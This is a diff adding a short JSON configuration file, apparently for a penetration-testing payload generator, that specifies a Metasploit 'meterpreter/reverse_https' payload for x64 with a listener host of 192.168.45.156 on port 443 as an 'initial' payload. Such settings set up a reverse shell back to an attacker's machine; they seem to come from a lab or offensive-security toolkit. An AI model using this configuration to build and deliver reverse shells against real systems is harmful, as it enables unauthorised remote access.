@@ -1,0 +1,11 @@
+{
+    "arch": [
+        "x64"
+    ],
+    "lhost": "192.168.45.156",
+    "lport": 443,
+    "msf_payload": "meterpreter/reverse_https",
+    "payload_type": [
+        "initial"
+    ]
+}
